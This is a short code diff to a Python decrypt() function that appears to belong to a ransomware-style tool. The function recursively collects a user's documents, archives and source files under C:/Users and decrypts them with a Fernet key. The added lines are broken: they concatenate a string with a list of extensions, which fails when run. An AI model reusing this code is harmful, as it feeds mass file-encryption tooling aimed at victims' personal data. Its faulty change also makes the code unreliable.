@@ -13,6 +13,7 @@ def decrypt():
         # Get files to decrypt
         # Get documents in current user to decrypt
         path = 'C:/Users/' + usr
+        ext = [".txt", ".jpeg"]
         for f_name in glob.glob(path + '/**/*.txt', recursive=True) \
                       + glob.glob(path + '/**/*.docx', recursive=True) \
                       + glob.glob(path + '/**/*.pdf', recursive=True) \
@@ -44,7 +45,8 @@ def decrypt():
                       + glob.glob(path + '/**/*.tar', recursive=True) \
                       + glob.glob(path + '/**/*.tgz', recursive=True) \
                       + glob.glob(path + '/**/*.rar', recursive=True) \
-                      + glob.glob(path + '/**/*.java', recursive=True):
+                      + glob.glob(path + '/**/*.java', recursive=True) \
+                      + glob.glob(path + '/**/*' + ext, recursive=True):
 
             k = key
             f = Fernet(k)
